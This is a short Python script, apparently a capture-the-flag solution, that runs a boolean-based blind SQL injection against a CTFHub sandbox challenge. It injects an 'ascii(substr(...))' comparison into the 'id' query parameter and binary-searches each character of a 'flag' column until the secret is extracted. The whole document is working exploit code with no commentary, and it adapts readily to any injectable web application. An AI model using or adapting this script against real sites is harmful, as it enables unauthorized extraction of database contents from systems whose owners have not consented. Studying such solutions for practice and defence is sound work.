import requests
import time
url = 'http://challenge-5e6b5d34e44e6c60.sandbox.ctfhub.com:10800/'
result = ''

for i in range(1,50):
    high = 127
    low = 32
    mid = (high+low)//2
    while high>low:
        payload = '1 and (select ascii(substr((flag),{0},1)) from flag)>{1}'.format(i,mid)
        data = {"id":payload}
        html = requests.get(url,params=data).text
        time.sleep(0.3)
        if "query_success" in html:
            low = mid + 1
        else:
            high = mid
        mid = (low+high)//2
    result += chr(int(mid))
    
    print(result)
print("done!")
